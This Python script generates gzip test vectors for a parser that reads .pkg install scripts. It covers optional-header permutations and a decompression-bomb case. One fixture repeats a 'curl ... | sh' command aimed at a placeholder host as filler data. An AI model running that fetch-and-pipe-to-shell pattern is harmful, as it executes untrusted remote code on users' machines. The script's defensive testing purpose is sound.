#!/usr/bin/env python3
"""Regenerate the gzip (RFC 1952) vectors under crates/nav-core/testdata/gzip/.

NAV reads .pkg install scripts out of a gzip stream stored in the xar heap
(design doc §5.2, §6.1), so the optional-field permutations matter: pkgbuild
emits a bare header, but nothing stops a hostile package carrying FEXTRA,
FNAME, FCOMMENT and FHCRC, and each one moves where the deflate data starts.

Ground truth is CPython's zlib. Pairs are <name>.in / <name>.out; bomb.in has
no .out on purpose (expected BudgetExceeded).

real_scripts.* is NOT produced by this script: it is the actual gzip'd cpio
Scripts entry lifted from a pkgbuild-produced package, kept as static bytes
because pkgbuild embeds inode/mtime/uid and so is not reproducible. Synthetic
headers alone can't prove we read what the real tool emits.

Usage: python3 generate.py <output-dir>
"""
import os, struct, sys, zlib

FTEXT, FHCRC, FEXTRA, FNAME, FCOMMENT = 1, 2, 4, 8, 16

def gz(data, *, flg=0, extra=b"", name=b"", comment=b"", mtime=0, os_byte=3, xfl=0,
       crc=None, isize=None, cm=8, id1=0x1f, id2=0x8b):
    """Build a gzip stream with an explicit flag set, so each optional field
    can be exercised independently."""
    head = struct.pack("<BBBBIBB", id1, id2, cm, flg, mtime, xfl, os_byte)
    if flg & FEXTRA:
        head += struct.pack("<H", len(extra)) + extra
    if flg & FNAME:
        head += name + b"\x00"
    if flg & FCOMMENT:
        head += comment + b"\x00"
    if flg & FHCRC:
        head += struct.pack("<H", zlib.crc32(head) & 0xFFFF)
    co = zlib.compressobj(9, zlib.DEFLATED, -15)
    body = co.compress(data) + co.flush()
    tail = struct.pack("<II",
                       zlib.crc32(data) & 0xFFFFFFFF if crc is None else crc,
                       len(data) & 0xFFFFFFFF if isize is None else isize)
    return head + body + tail

def build():
    c = {}
    c["plain"]      = (b"hello, world", gz(b"hello, world"))
    c["fname"]      = (b"#!/bin/sh\nexit 0\n",
                       gz(b"#!/bin/sh\nexit 0\n", flg=FNAME, name=b"preinstall"))
    c["extra"]      = (b"payload", gz(b"payload", flg=FEXTRA, extra=b"AB\x02\x00zz"))
    c["comment"]    = (b"payload", gz(b"payload", flg=FCOMMENT, comment=b"a comment"))
    c["hcrc"]       = (b"payload", gz(b"payload", flg=FHCRC))
    c["all_fields"] = (b"every optional header field at once",
                       gz(b"every optional header field at once",
                          flg=FEXTRA | FNAME | FCOMMENT | FHCRC | FTEXT,
                          extra=b"XX\x01\x00q", name=b"Scripts", comment=b"c"))
    # Empty payload still carries a full header and trailer.
    c["empty"]      = (b"", gz(b""))
    # Larger, repetitive: forces multiple deflate blocks under the wrapper.
    big = (b"curl -fsSL https://example.invalid/x | sh\n" * 2000)
    c["multiblock"] = (big, gz(big))
    return c

if __name__ == "__main__":
    out = sys.argv[1] if len(sys.argv) > 1 else "."
    os.makedirs(out, exist_ok=True)
    for name, (plain, comp) in build().items():
        open(os.path.join(out, name + ".out"), "wb").write(plain)
        open(os.path.join(out, name + ".in"), "wb").write(comp)
        print(f"{name:12s} in={len(comp):7d} out={len(plain):7d}")
    # 8 MiB of zeros: must be refused as BudgetExceeded, so no .out.
    open(os.path.join(out, "bomb.in"), "wb").write(gz(b"\x00" * (8 << 20)))
    print(f"{'bomb':12s} in={os.path.getsize(os.path.join(out,'bomb.in')):7d} (no .out)")
